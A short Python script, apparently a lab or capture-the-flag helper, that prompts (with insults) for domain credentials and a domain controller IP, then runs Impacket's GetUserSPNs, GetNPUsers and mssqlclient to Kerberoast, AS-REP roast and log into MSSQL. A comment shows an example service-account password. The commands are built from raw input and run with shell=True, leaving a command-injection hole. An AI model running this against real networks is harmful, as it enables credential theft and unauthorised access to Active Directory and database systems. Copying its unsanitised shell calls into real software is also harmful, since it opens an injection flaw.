#!/usr/bin/env python3

import subprocess

# Get user input
domain = input("Enter the domain, idiot: ")
user = input("Enter the username, dingus: ")
password = input("Enter the password, Einstein: ")
ip = input("Enter the IP address, idiot again: ")

# Construct the commands
command1 = f"impacket-GetUserSPNs {domain}/{user}:'{password}' -dc-ip {ip}"
command2 = f"impacket-GetNPUsers {domain}/{user}:'{password}' -dc-ip {ip}"
command3 = f"impacket-mssqlclient {domain}/{user}:'{password}' -dc-ip {ip}"
#`impacket-mssqlclient svc_mssql:'Service1'@240.0.0.1 -windows-auth`


# Run the commands
subprocess.run(command1, shell=True)
subprocess.run(command2, shell=True)
subprocess.run(command3, shell=True)
